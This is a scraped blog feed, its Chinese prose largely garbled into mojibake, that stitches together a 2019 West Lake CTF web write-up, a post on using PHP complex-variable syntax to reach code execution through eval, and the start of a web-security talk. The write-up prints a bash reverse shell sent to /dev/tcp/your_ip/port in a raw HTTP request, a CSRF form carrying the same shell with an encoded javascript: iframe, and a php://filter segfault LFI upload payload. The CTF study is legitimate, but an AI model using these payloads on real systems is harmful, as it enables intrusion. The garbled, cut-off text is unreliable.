ç•Œé¢æäº¤å°±å¥½äº†ã€‚\n \næˆåŠŸæ‹¿åˆ° cookie ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åªéœ€è¦å¸¦ç€ cookie å»æ‰§è¡Œå‘½ä»¤å°±å¥½äº†\nPOST /exec.php HTTP/1.1 Host: ctf2.linkedbyx.com:10611 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://ctf2.linkedbyx.com:10611/exec.php Content-Type: application/x-www-form-urlencoded Content-Length: 97 Connection: close Cookie: PHPSESSID=hsujvjlaum6vc2c3tg5mraq774; token=KLIMdHTGEnxXSG4mrRRCuQ==; admin=admin_!@@!_admin_admin_hhhhh Upgrade-Insecure-Requests: 1 command=bash%20-c%20%22sh%20%3E%26%20%2Fdev%2Ftcp%2Fyour_ip%2Fport%200%3E%261%22%20\u0026amp;exec=1 è¿™é‡Œæˆ‘ç›´æ¥å¼¹äº† shell ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å‘ç° flag.txt\n \nå…¶å®å¦‚æœæ‹¿ä¸åˆ° cookie çš„è¯ï¼Œä¹Ÿå¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼å»æ„é€ ä¸€ä¸ª CSRF\n\u0026lt;form action=\u0026#34;exec.php\u0026#34; method=\u0026#34;post\u0026#34; id=\u0026#34;myform\u0026#34;\u0026gt; \u0026lt;input value=\u0026#34;bash -c \u0026#39;sh \u0026gt;\u0026amp; /dev/tcp/your_ip/port 0\u0026gt;\u0026amp;1\\\u0026#39;\u0026#34; name=\u0026#34;command\u0026#34;\u0026gt; \u0026lt;input value=\u0026#34;1\u0026#34; name=\u0026#34;exec\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;iframe src=\u0026#34;\u0026amp;#106;\u0026amp;#97;\u0026amp;#118;\u0026amp;#97;\u0026amp;#115;\u0026amp;#99;\u0026amp;#114;\u0026amp;#105;\u0026amp;#112;\u0026amp;#116;:parent.document.getElementById(\u0026#39;myform\u0026#39;).submit();\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; äº‹å®è¯æ˜ä¹Ÿç¡®å®å¯ä»¥è¿™ä¹ˆå»åšã€‚\n \nwaf é»‘åå•å¦‚ä¸‹ï¼š\nfunction waf($str){ $black_list = \u0026#34;script|\\W+on.*?=\u0026#34;; $str = preg_replace(\u0026#34;/\u0026#34;.$black_list.\u0026#34;/i\u0026#34;,\u0026#34;:)\u0026#34;,$str); return $str; } Web 3 babyt3 Description {% colorquote info %} babyt3(Ubuntu 16.04 php7.0)\né¢˜ç›®åœ°å€ï¼šhttp://ctf1.linkedbyx.com:10010\n{% endcolorquote %}\nHacking index æç¤ºäº†æœ‰ dir.php è·Ÿ include $_GET['FILE']\nDir.php å¯ä»¥åˆ—ç›®å½•ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ° flag ï¼Œç”¨http://ctf1.linkedbyx.com:10010/?file=/ffffflag_1s_Her4åŒ…å«å³å¯\nçœŸå¿ƒæƒ³åæ§½ï¼Œè¿™ä¹ˆæ°´çš„é¢˜ä½ å‡ºåœ¨è¥¿æ¹–è®ºå‰‘ä¸Šåˆé€‚å—ï¼Ÿï¼Ÿï¼Ÿè¿˜ä¸å¦‚æœˆèµ›\nèµ›åè·Ÿå¸ˆå‚…ä»¬è®¨è®ºçš„æ—¶å€™ï¼Œå‘ç° web3 è¿™ç§é¢˜ç«Ÿç„¶â€¦èƒ½æ”¾ä¸Šæ¥\u0026hellip;\nindex.php æºç ï¼š\n\u0026lt;?php $a = @$_GET[\u0026#39;file\u0026#39;]; if (!$a) { $a = \u0026#39;./templates/index.html\u0026#39;; } echo \u0026#39;include $_GET[\\\u0026#39;file\\\u0026#39;]\u0026#39;; if (strpos(\u0026#39;flag\u0026#39;,$a)!==false) { die(\u0026#39;nonono\u0026#39;); } include $a; ?\u0026gt;\u0026lt;!--hint: dir.php --\u0026gt; Dir.php æºç ï¼š\n\u0026lt;?php $a = @$_GET[\u0026#39;dir\u0026#39;]; if(!$a){ $a = \u0026#39;/tmp\u0026#39;; } var_dump(scandir($a)); ç„¶åæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°è¿™ä¸ªé¢˜æ˜¯å¤šä¹ˆå¤šä¹ˆ\u0026hellip;\n{% colorquote danger %}\nstrpos(\u0026lsquo;flag\u0026rsquo;,$a) !== false\n{% endcolorquote %}\nstropså‚æ•°éƒ½å†™åäº†â€¦æ‰€ä»¥å°±æˆäº†æ²¡æœ‰è¿‡æ»¤çš„ä¸€é“é¢˜\u0026hellip;\né¢„æœŸè§£ é¢„æœŸè§£çŒœæµ‹å°±æ˜¯ä½¿ç”¨ php 7 çš„ä¸€ä¸ª segmentfault é”™è¯¯çš„ bugï¼Œä¹Ÿå¯¹ä¸Šäº†é¢˜ç›®æè¿°ä¸€å¼€å§‹ç»™å‡ºäº†ç¯å¢ƒé…ç½®çš„åŸå› \nPOST /index.php?file=php://filter/string.strip_tags/resource=/etc/passwd HTTP/1.1 Host: localhost:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://localhost/test.php Content-Type: multipart/form-data; boundary=---------------------------9417939141775834208717807850 Content-Length: 248 Connection: close Cookie: PHPSESSID=09e1deae1da0a95b2515a0c0a9a07c8b Upgrade-Insecure-Requests: 1 -----------------------------9417939141775834208717807850 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;test.php\u0026#34; Content-Type: application/octet-stream \u0026lt;?php phpinfo();?\u0026gt; -----------------------------9417939141775834208717807850-- å‘ä»¥ä¸Š http åŒ…ï¼Œå°†php://filter/string.strip_tags/resource=/etc/passwdè¿™ä¸ª payload ä¼ å…¥includeæ–¹æ³•ä¼šè®© php äº§ç”Ÿä¸€ä¸ª segmentfault ï¼Œç„¶ååœ¨è¿™æ®µæ—¶é—´å†…ä¸Šä¼ çš„æ–‡ä»¶å°†ä¼šå­˜å‚¨åœ¨ php.ini æŒ‡å®šçš„ upload_tmp_dir æ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶ä¸”ä¸ä¼šè¢«åˆ é™¤ã€‚\nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åŒ…å«æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ä»£ç äº†ã€‚å…·ä½“çœ‹LFI via SegmentFault\nè‡ªå·±åšäº†ä¸ªæ¼æ´ç¯å¢ƒä¾›å¤ç°ï¼šPHP7-LFI\nWeb 4 blog Description {% colorquote info %} NULL\n{% endcolorquote %}\nHacking åŸé¢˜ï¼ŒGoogle CTF 2018 bbs\ngithub æºç åœ°å€: https://github.com/google/google-ctf/tree/master/2018/quals/web-bbs\nWp: https://ctftime.org/task/6243\nConclusion è¿™æ¬¡æ¯”èµ›æ”¶è·ä¸å¤§ï¼Œè¯´å®åœ¨çš„ï¼Œè¿˜æ²¡å®‰æ’æœˆèµ›è´¨é‡é«˜ï¼Œè€Œä¸”ç¬¬ä¸‰é¢˜å‡ºçš„çœŸçš„æ˜¯ç§€äº†æˆ‘ä¸€è„¸ï¼Œè®©æˆ‘å¾ˆæ€€ç–‘å®‰æ’å¯¹è¿™æ¬¡æ¯”èµ›çš„é¢˜ç›®çš„æ£€éªŒç­‰ï¼Œä¹Ÿè®©æˆ‘å¯¹æ¥ä¸‹æ¥å¦‚ä½•å»åŠå¥½ä¸€åœºæ¯”èµ›æœ‰ä¸€äº›å€Ÿé‰´ç»éªŒï¼Œå¸Œæœ›æ¥ä¸‹æ¥çš„ SUCTF å…¨å›½èµ›ä¸ä¼šå‡ºç°è¿™ç§éš¾ä»¥å…¥ç›®çš„ä½çº§é”™è¯¯ã€‚\n","date":"2019-04-11T23:44:48Z","permalink":"https://blog.zeddyu.info/2019/04/11/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/","title":"2019 è¥¿æ¹–è®ºå‰‘ Web wp"},{"content":"è¿‘æœŸæœ‰å°ä¼™ä¼´é—®äº†æˆ‘ä¸€é“é¢˜ï¼Œç„¶åè‡ªå·±å‘æ˜åˆ°äº†ä¸€äº›å…³äº PHP å¤æ‚å˜é‡ä¸å¤ªè¢«å…³æ³¨çš„é—®é¢˜ã€‚\n[TOC]\nèµ·å›  èµ·å› æ˜¯å› ä¸ºä¸€ä¸ªå°ä¼™ä¼´é—®äº†æˆ‘ä¸€é“é¢˜\n\u0026lt;?php highlight_file(__FILE__); $str = $_GET[\u0026#39;str\u0026#39;]; $str = addslashes($str); if(preg_match(\u0026#39;/[A-Za-z0-9]+\\(/i\u0026#39;,$str) == 1){ die(\u0026#39;hack\u0026#39;); } eval(\u0026#39;$a=\u0026#34;\u0026#39; . $str . \u0026#39;\u0026#34;;\u0026#39;); ?\u0026gt;è‡ªå·±æƒ³äº†å¥½ä¸€ä¼šå¥½åƒå¹¶æ²¡æœ‰èƒ½ç”¨è‡ªå·±å½“æ—¶çš„ç°æœ‰çŸ¥è¯†å»è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œäºæ˜¯æˆ‘å»æœé›†äº†ä¸€äº›èµ„æ–™å­¦åˆ°äº†ä¸€äº›æ–°çš„çŸ¥è¯†ã€‚æ„Ÿå…´è¶£çš„å°ä¼™ä¼´å¯ä»¥å…ˆè‡ªå·±åšä¸€ä¸‹å“ˆï½\né¢˜ç›®è§£é‡Š æ•´ä¸ªä»£ç é€»è¾‘éå¸¸ç®€å•ï¼Œæ¥å—ä¸€ä¸ª$_GET['str']çš„ä¼ å‚ï¼Œåœ¨ç»è¿‡addslashes()å‡½æ•°è½¬ä¹‰ç‰¹æ®Šç¬¦å·ä¸æ­£åˆ™è¡¨è¾¾å¼æ£€éªŒä¹‹åï¼Œä¼ å…¥eval()å½“ä¸­æ‹¼æ¥åˆ°$a=\u0026quot;\u0026quot;;å˜é‡å½“ä¸­ã€‚\næ—¢ç„¶æœ‰eval()ï¼Œé‚£æ˜¯ä¸æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å½“ç„¶å¯ä»¥çš„ã€‚\né¦–å…ˆæˆ‘ä»¬æ¥çœ‹æ­£åˆ™è¡¨è¾¾å¼çš„æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º\n \nå¦‚æœå°æ‹¬å·å‰æœ‰æ•°å­—æˆ–è€…å­—æ¯çš„è¯å°±ä¼šdie()æ‰æ•´ä¸ªç¨‹åºï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯é˜²æ­¢ç›´æ¥ä½¿ç”¨å‡½æ•°ï¼Œä¾‹å¦‚ä¸èƒ½ç›´æ¥ä½¿ç”¨system('ls')è¿™æ ·å­ã€‚\nPHP å¤æ‚å˜é‡ Introduction ä¸‹é¢æˆ‘ä»¬ç®€å•ä»‹ç»ä¸€ä¸ªå…³æ³¨åº¦æ¯”è¾ƒå°‘çš„ä¸€ä¸ª php çŸ¥è¯†â€”â€”PHP å¤æ‚å˜é‡ã€‚æŒ‰ç…§ php å®˜æ–¹æ–‡æ¡£å¯¹å¤æ‚å˜é‡çš„ä»‹ç»\n{% colorquote success %}\nå¤æ‚è¯­æ³•ä¸æ˜¯å› ä¸ºå…¶è¯­æ³•å¤æ‚è€Œå¾—åï¼Œè€Œæ˜¯å› ä¸ºå®ƒå¯ä»¥ä½¿ç”¨å¤æ‚çš„è¡¨è¾¾å¼ã€‚\nä»»ä½•å…·æœ‰ string è¡¨è¾¾çš„æ ‡é‡å˜é‡ï¼Œæ•°ç»„å•å…ƒæˆ–å¯¹è±¡å±æ€§éƒ½å¯ä½¿ç”¨æ­¤è¯­æ³•ã€‚åªéœ€ç®€å•åœ°åƒåœ¨ string ä»¥å¤–çš„åœ°æ–¹é‚£æ ·å†™å‡ºè¡¨è¾¾å¼ï¼Œç„¶åç”¨èŠ±æ‹¬å· { å’Œ } æŠŠå®ƒæ‹¬èµ·æ¥å³å¯ã€‚ç”±äº { æ— æ³•è¢«è½¬ä¹‰ï¼Œåªæœ‰ $ ç´§æŒ¨ç€ { æ—¶æ‰ä¼šè¢«è¯†åˆ«ã€‚å¯ä»¥ç”¨ {$ æ¥è¡¨è¾¾ {$ã€‚\n{% endcolorquote %}\næˆ‘ä»¬ä»‹ç»ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š\n\u0026lt;?php $great = \u0026#39;fantastic\u0026#39;; // æ— æ•ˆï¼Œè¾“å‡º: This is { fantastic} echo \u0026#34;This is { $great}\u0026#34;; // æœ‰æ•ˆï¼Œè¾“å‡ºï¼š This is fantastic echo \u0026#34;This is {$great}\u0026#34;; echo \u0026#34;This is ${great}\u0026#34;; ä¹Ÿå°±æ˜¯è¯´åœ¨ php ä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨${xxx}çš„å½¢å¼æ¥è¡¨è¾¾ä¸€ä¸ªå˜é‡ã€‚\nUsage å®˜æ–¹æ–‡æ¡£è¿˜ç»™å‡ºäº†ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„ Note:\n{% colorquote success %}\nNote:\nå‡½æ•°ã€æ–¹æ³•ã€é™æ€ç±»å˜é‡å’Œç±»å¸¸é‡åªæœ‰åœ¨ PHP 5 ä»¥åæ‰å¯åœ¨ {$} ä¸­ä½¿ç”¨ã€‚ç„¶è€Œï¼Œåªæœ‰åœ¨è¯¥å­—ç¬¦ä¸²è¢«å®šä¹‰çš„å‘½åç©ºé—´ä¸­æ‰å¯ä»¥å°†å…¶å€¼ä½œä¸ºå˜é‡åæ¥è®¿é—®ã€‚åªå•ä¸€ä½¿ç”¨èŠ±æ‹¬å· ({}) æ— æ³•å¤„ç†ä»å‡½æ•°æˆ–æ–¹æ³•çš„è¿”å›å€¼æˆ–è€…ç±»å¸¸é‡ä»¥åŠç±»é™æ€å˜é‡çš„å€¼ã€‚\n{% endcolorquote %}\nå‡½æ•°ã€æ–¹æ³•ï¼æ‰€ä»¥æˆ‘ä»¬æ ¹æ®æ–‡æ¡£å¯ä»¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ\n\u0026lt;?php highlight_file(__FILE__); $a = \u0026#34;${phpinfo()}\u0026#34;; ?\u0026gt; \nThinking ç„¶è€Œä¸ºä»€ä¹ˆå¯ä»¥è¿™ä¹ˆåšå‘¢ï¼Ÿè™½ç„¶å®˜æ–¹æ–‡æ¡£å¾ˆæ˜ç¡®çš„æŒ‡å‡ºäº†ï¼Œä½†æ˜¯æ˜¯ä¸æ˜¯è¿˜æ˜¯æœ‰ä¸€ç‚¹è´¹è§£çš„æ„Ÿè§‰ï¼Ÿ\nå…¶å®åœ¨ php ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥é˜… php æ–‡æ¡£çŸ¥é“æœ‰\n{% colorquote success %}\nPHP ä¸­çš„å˜é‡ç”¨ä¸€ä¸ªç¾å…ƒç¬¦å·åé¢è·Ÿå˜é‡åæ¥è¡¨ç¤ºã€‚å˜é‡åæ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚\nå˜é‡åä¸ PHP ä¸­å…¶å®ƒçš„æ ‡ç­¾ä¸€æ ·éµå¾ªç›¸åŒçš„è§„åˆ™ã€‚ä¸€ä¸ªæœ‰æ•ˆçš„å˜é‡åç”±å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å¼€å¤´ï¼Œåé¢è·Ÿä¸Šä»»æ„æ•°é‡çš„å­—æ¯ï¼Œæ•°å­—ï¼Œæˆ–è€…ä¸‹åˆ’çº¿ã€‚æŒ‰ç…§æ­£å¸¸çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå®ƒå°†è¢«è¡¨è¿°ä¸ºï¼š[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*'ã€‚\n{% endcolorquote %}\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°${phpinfo()}é‡Œé¢åœ¨ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´å¹¶ä¸æ˜¯ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¸ºä»€ä¹ˆå¯ä»¥æ‰§è¡Œå‘¢ï¼Ÿ\nè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­\n \n \nåœ¨ php ä¸­ï¼Œå¯ä»¥æ¥å—å‡½æ•°çš„è¿”å›å€¼ä½œä¸ºå˜é‡åï¼Œè€Œphpinfo()çš„è¿”å›å€¼ä¸ºTRUEï¼Œæ‰€ä»¥å…ˆå°†phpinfo()æ‰§è¡Œäº†ï¼Œå°†è¿”å›å€¼è¿”å›ä½œä¸ºäº†å˜é‡åã€‚\næˆ‘ä»¬å¯ä»¥å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ã€‚\n \nè¿™é‡Œå°±æ›´æ¸…æ¥šçš„è¯´æ˜äº†æ‰§è¡Œäº†system('whomai')å¹¶æŠŠå…¶è¿”å›å€¼zeddä½œä¸ºäº†å˜é‡ï¼Œæœ€å$zeddæ‰è¢«ä¿®æ”¹äº†ã€‚\nè¿™é‡Œä¹Ÿä¸phpå˜é‡è§£æçš„å¤æ‚è¯­æ³•ä½œè€… @s1ye å¸ˆå‚…äº¤æµäº†ä¸€ä¸‹ï¼Œä¹Ÿè·Ÿä»–è®¨è®ºäº†ä»–æ–‡ç« ä¸­æœ‰å‡ ä¸ªåœ°æ–¹å­˜åœ¨çš„ç–å¿½ä¹‹å¤„ï¼Œ${phpinfo()}å¾—åˆ°çš„å¹¶éæ˜¯$TRUEï¼Œå…·ä½“å¯ä»¥ä½¿ç”¨ä¸Šè¿°æ–¹æ³•çœ‹çœ‹ã€‚\nChallanges Easy æˆ‘ä»¬ä¸å¦¨å…ˆæŠŠé—®é¢˜ç®€åŒ–ï¼Œå¦‚æœæ²¡æœ‰ä»»ä½•é˜²æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥æ€ä¹ˆåšå‘¢ï¼Ÿ\n\u0026lt;?php error_reporting(0); highlight_file(__FILE__); $str = $_GET[\u0026#39;str\u0026#39;]; eval(\u0026#39;$a=\u0026#34;\u0026#39; . $str . \u0026#39;\u0026#34;;\u0026#39;); ?\u0026gt;ç›´æ¥ä¼ å…¥æ‹¼æ¥è‡ªç„¶æˆ‘ä»¬è‚¯å®šæœ‰åŒå¼•å·é—­åˆè¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚\nMedium \u0026lt;?php error_reporting(0); highlight_file(__FILE__); $str = $_GET[\u0026#39;str\u0026#39;]; $str = addslashes($str); eval(\u0026#39;$a=\u0026#34;\u0026#39; . $str . \u0026#39;\u0026#34;;\u0026#39;); ?\u0026gt;é‚£åŠ ä¸Šaddslashes()æ–¹æ³•å‘¢ï¼Ÿæ—¢ç„¶ä¸èƒ½é€ƒé€¸åŒå¼•å·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ php å¤æ‚å˜é‡æ¥å¤„ç†ã€‚\n \nDifficult \u0026lt;?php highlight_file(__FILE__); $str = $_GET[\u0026#39;str\u0026#39;]; $str = addslashes($str); if(preg_match(\u0026#39;/[A-Za-z0-9]+\\(/i\u0026#39;,$str) == 1){ die(\u0026#39;hack\u0026#39;); } eval(\u0026#39;$a=\u0026#34;\u0026#39; . $str . \u0026#39;\u0026#34;;\u0026#39;); ?\u0026gt;å¥½çš„ï¼Œç»ˆäºå›åˆ°äº†æˆ‘ä»¬é¢˜ç›®ï¼Œè¿™æ ·çš„è¯å°±ä¸èƒ½å•çº¯åœ°ä½¿ç”¨å‡½æ•°æ–¹æ³•äº†ã€‚é‚£æˆ‘ä»¬å¯ä»¥æ€ä¹ˆåšå‘¢ï¼Ÿ\nå¦‚æœå¼€å¯äº†Noticeå›æ˜¾çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå¼•å·å°±å¯ä»¥ç®€å•å®ç°å‘½ä»¤æ‰§è¡Œäº†\n \né‚£è¦æ˜¯æ²¡å¼€å¯å‘¢ï¼Ÿè‡ªç„¶ä¸å¯è¡Œäº†ã€‚\n \næ¥ä¸‹æ¥å°±å¯ä»¥åˆ©ç”¨å¯å˜å‡½æ•°çš„ä¸å­—ç¬¦ä¸²æ‹¼æ¥çš„ç‰¹æ€§äº†ï¼Œç®€å•æ¥è¯´å°±ç”¨ä¸‹å›¾çš„æŠ€å·§ï¼Œè¯¦ç»†çš„å¯ä»¥ç§»æ­¥ä¸ªäººåšå®¢æŸ¥çœ‹Some Tricks of Bypass php waf\n \n \næ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™é‡Œç©æ³•å°±å¾ˆå¤šæ ·äº†\n \nå…³äº php å¤æ‚å˜é‡çš„ç©æ³•è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±å¤§æ¦‚è¯´åˆ°è¿™é‡Œå§ï¼Œæ–‡ä¸­æœ‰ä¸å¯¹ä¹‹å¤„è¿˜æœ›å¸ˆå‚…ä»¬æ–§æ­£ã€‚\nReference php æ–‡æ¡£-String å­—ç¬¦ä¸²\nphp æ–‡æ¡£-å¤æ‚(èŠ±æ‹¬å·)è¯­æ³•\nphpå˜é‡è§£æçš„å¤æ‚è¯­æ³•\n","date":"2019-04-11T01:57:32Z","permalink":"https://blog.zeddyu.info/2019/04/11/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/","title":"ä»ä¸€é“é¢˜è®²PHPå¤æ‚å˜é‡"},{"content":"è¿™æ˜¯ç»™A2OSåšçš„å…³äº Web å®‰å…¨çš„åˆ†äº«å†…å®¹æ¦‚è¦\nVulnerability Introduction What is a vulnerability ? ä»€ä¹ˆæ˜¯æ¼æ´ï¼Ÿ {% colorquote success %} æ¼æ´æ˜¯åœ¨ç¡¬ä»¶ã€è½¯ä»¶ã€åè®®çš„å…·ä½“å®ç°æˆ–ç³»ç»Ÿå®‰å…¨ç­–ç•¥ä¸Šå­˜åœ¨çš„ç¼ºé™·ï¼Œä»è€Œå¯ä»¥ä½¿æ”»å‡»è€…èƒ½å¤Ÿåœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è®¿é—®æˆ–ç ´åç³»ç»Ÿã€‚å…·ä½“ä¸¾ä¾‹æ¥è¯´ï¼Œæ¯”å¦‚åœ¨Intel PentiumèŠ¯ç‰‡ä¸­å­˜åœ¨çš„é€»è¾‘é”™è¯¯ï¼Œåœ¨Sendmailæ—©æœŸç‰ˆæœ¬ä¸­çš„ç¼–ç¨‹é”™è¯¯ï¼Œåœ¨NFSåè®®ä¸­è®¤è¯æ–¹å¼ä¸Šçš„å¼±ç‚¹ï¼Œåœ¨ Unix ç³»ç»Ÿç®¡ç†å‘˜è®¾ç½®åŒ¿åFtpæœåŠ¡æ—¶é…ç½®ä¸å½“çš„é—®é¢˜éƒ½å¯èƒ½è¢«æ”»å‡»è€…ä½¿ç”¨ï¼Œå¨èƒåˆ°ç³»ç»Ÿçš„å®‰å…¨ã€‚å› è€Œè¿™äº›éƒ½å¯ä»¥è®¤ä¸ºæ˜¯ç³»ç»Ÿä¸­å­˜åœ¨çš„å®‰å…¨æ¼æ´ã€‚ {% endcolorquote %}\n{% colorquote success %} In computer security, a vulnerability is a weakness which can be exploited by a threat actor, such as an attacker, to perform unauthorized actions within a computer system. To exploit a vulnerability, an attacker must have at least one applicable tool or technique that can connect to a system weakness. In this frame, vulnerability is also known as the attack surface. {% endcolorquote %}\næ¼æ´æ˜¯å¤©ç”Ÿçš„å—ï¼Ÿ æ—¢ç„¶æ˜¯å¤©ç”Ÿå­˜åœ¨çš„ï¼Œä¸ºä»€ä¹ˆè®¾è®¡è€…ä¸å»æ‰¾éœ€è¦å®‰å…¨å·¥ä½œè€…å»æ‰¾ï¼Ÿè¢«åˆ©ç”¨çš„å«æ¼æ´ï¼Œæ²¡è¢«åˆ©ç”¨çš„èƒ½å«æ¼æ´å—ï¼Ÿ\nåœ¨è®¡ç®—æœºé¢†åŸŸï¼Œæ¼æ´ç‰¹æŒ‡ç³»ç»Ÿçš„å®‰å…¨æ–¹é¢å­˜åœ¨ç¼ºé™·ï¼Œä¸€èˆ¬è¢«å®šä¹‰ä¸ºä¿¡æ¯ç³»ç»Ÿè®¾è®¡ã€ç¼–ç å’Œè¿è¡Œå½“ä¸­å¼•èµ·çš„ã€å¯èƒ½è¢«å¤–éƒ¨åˆ©ç”¨ç”¨äºå½±å“ä¿¡æ¯ç³»ç»Ÿæœºå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§çš„ç¼ºé™·ã€‚\nç»Ÿè®¡è¡¨æ˜ï¼Œç¨‹åºå‘˜æ¯å†™ 1000 è¡Œä»£ç ï¼Œå°±ä¼šæœ‰ 1 ä¸ªç¼ºé™·ï¼Œä¸€ä¸ªå¤§å‹çš„åº”ç”¨ç³»ç»Ÿï¼Œä»£ç è¡Œæ•°åŠ¨è¾„å‡ åä¸‡è¡Œï¼Œç”šè‡³æ›´å¤šã€‚å¯ä»¥è¯´ï¼Œä»ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªæ“ä½œç³»ç»Ÿæˆ–åº”ç”¨è½¯ä»¶è¯ç”Ÿçš„é‚£å¤©å¼€å§‹ï¼Œç¼ºé™·å°±å­˜åœ¨äº IT ç³»ç»Ÿçš„å„ä¸ªç¯èŠ‚ï¼Œè€Œä¸”å§‹ç»ˆä¼šå­˜åœ¨ã€‚\næ¼æ´æ¥æº é¦–å…ˆæ¼æ´æ¥è‡ªæ“ä½œç¼ºé™·ã€‚\nç¨‹åºå‘˜ç¼–ç¨‹åºæ—¶çš„ç–å¿½ã€è¿ç»´äººå‘˜è®¾ç½®å®‰å…¨é…ç½®æ—¶çš„ä¸å½“æ“ä½œã€ç”¨æˆ·è®¾ç½®çš„ç®€å•å£ä»¤å’Œæ³„éœ²â€¦â€¦è¿™äº›äººä¸ºçš„ã€æ— æ„çš„å¤±è¯¯å°±æ˜¯æ“ä½œç¼ºé™·ã€‚\nå…¶æ¬¡ï¼Œæ¼æ´æ¥è‡ªè®¤çŸ¥ç¼ºé™·ã€‚\n2000å¹´çš„â€œåƒè¶³è™«â€å±æœºï¼Œè¿‡å»ä¸ºäº†èŠ‚çœç©ºé—´ï¼Œå­˜å‚¨å¹´ä»½ç”¨ä¸¤ä½åè¿›åˆ¶æ•°è¡¨ç¤ºï¼Œä¾‹å¦‚1980å°±æ˜¯80ï¼Œ1998å¹´å‡ºç”Ÿå°±æ˜¯98-80=18ï¼Œä½†æ˜¯åœ¨2000å°±å˜æˆäº†è´Ÿæ•°ï¼Œå°±ä¼šå¼•èµ·å„ç§ç³»ç»Ÿç´Šä¹±ç”šè‡³å´©æºƒã€‚\n2018å¹´1æœˆçš„ Meltdown \u0026amp; Spectre ã€‚ä¸ºäº†æå‡ CPU å¤„ç†æ€§èƒ½ï¼ŒèŠ¯ç‰‡ä¼ä¸šç”¨ä¹±åºæ‰§è¡Œå’Œé¢„æµ‹æ‰§è¡Œã€‚é€šä¿—æ¥è¯´ï¼ŒCPU å¹¶ä¸å®Œå…¨ä¸¥æ ¼æŒ‰ç…§æŒ‡ä»¤çš„é¡ºåºæ¥æ‰§è¡Œï¼Œè€Œæ˜¯ä¼šè‡ªå·±é¢„æµ‹å¯èƒ½è¦æ‰§è¡Œçš„å†…å®¹ï¼Œä»¥åŠä¸ºäº†æ›´å¥½åœ°åˆ©ç”¨ CPU èµ„æºå°†æŒ‡ä»¤é¡ºåºæ‰“ä¹±ï¼Œä»¥ä¾¿èƒ½åŒæ—¶æ‰§è¡Œä¸€äº›æŒ‡ä»¤ã€‚\nä½†è®¾è®¡è€…æ²¡æœ‰è€ƒè™‘åˆ°ï¼Œæˆ–è€…æ²¡æœ‰äººä¸ºè¿™ä¸ªé—®é¢˜æ—¶é‡è¦çš„ï¼Œå³ï¼šç”±äº CPU ç¼“å­˜å†…å®¹æ²¡æœ‰åŒæ­¥æ¢å¤åˆ°åŸå§‹çŠ¶æ€ï¼Œå¯¼è‡´ç¼“å­˜ä¸­å­˜å‚¨çš„é‡è¦ä¿¡æ¯å¯ä»¥è¢«æ¼æ´åˆ©ç”¨è€…è·å–ï¼Œå¯èƒ½ä¼šé€ æˆå—ä¿æŠ¤çš„å¯†ç å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚\næœ€åï¼Œæ¼æ´æ¥è‡ªäºçŸ¥è¯†ç¼ºé™·ã€‚\nå¾ˆçªå‡ºçš„ä¸€ä¸ªä¾‹å­å°±æ˜¯å·¥æ§å®‰å…¨ã€‚åŸæœ¬çš„å·¥ä¸šæ§åˆ¶ç³»ç»Ÿï¼Œå¤§å¤šä»¥ç³»ç»ŸåŠŸèƒ½ä½œä¸ºç¬¬ä¸€è¦ç´ ï¼Œå¤šæ•°ç³»ç»Ÿåœ¨è®¾è®¡ä¹‹åˆæ—¶å°é—­çš„â€œå•æœºç³»ç»Ÿâ€ï¼Œè¿è”ç½‘éœ€æ±‚éƒ½æ²¡æœ‰è€ƒè™‘è¿‡ï¼Œå°±æ›´ä¸è¦æåœ¨è®¾è®¡ã€ç 